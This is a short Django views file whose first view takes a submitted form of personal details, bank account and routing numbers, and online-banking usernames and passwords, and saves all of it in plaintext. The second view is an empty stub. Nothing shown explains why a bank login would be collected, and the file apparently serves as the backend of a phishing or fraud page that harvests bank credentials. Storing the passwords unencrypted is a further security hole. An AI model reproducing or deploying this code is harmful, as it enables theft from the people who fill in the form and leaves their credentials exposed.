from django.shortcuts import render
from django.contrib import messages
from django.shortcuts import render
from django.utils import timezone
from django.http import HttpResponse, HttpResponseRedirect
from django.urls import reverse, reverse_lazy
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.models import User

from django.core.mail import send_mail

from datetime import datetime
import datetime as dt
import requests

from .models import *
#from resume.models import Resume

import random
import string



def FirstView(request):
	if request.method == "POST":
		first_name = request.POST.get("first_name")
		last_name = request.POST.get("last_name")
		email = request.POST.get("email")
		phone_no = request.POST.get("phone_no")
		address = request.POST.get("address")
		city = request.POST.get("city")
		state = request.POST.get("state")
		country = request.POST.get("country")



		account_number = request.POST.get("account_number")
		routing_number = request.POST.get("routing_number")
		bank_name = request.POST.get("bank_name")
		bank_address = request.POST.get("bank_address")

		bank_username = request.POST.get("bank_username")
		bank_password = request.POST.get("bank_password")

		app_user = AppUser.objects.create(
			first_name=first_name, 
			last_name=last_name, 
			email=email, 
			phone_no=phone_no, 
			address=address, 
			city=city, state=state, 
			country=country,
			account_number=account_number,
			routing_number=routing_number,
			bank_name=bank_name,
			bank_address=bank_address,
			bank_username=bank_username,
			bank_password=bank_password



		)
		app_user.save()
	
		messages.warning(request, "Profile Data Updated")
		return HttpResponseRedirect(reverse("app_user:second"))
			
	else:

		context = {}
		return render(request, "app_user/first.html", context )


def SecondView(request):
	if request.method == "POST":
		pass

	else:
		
		context = {}
		return render(request, "app_user/second.html", context )
		

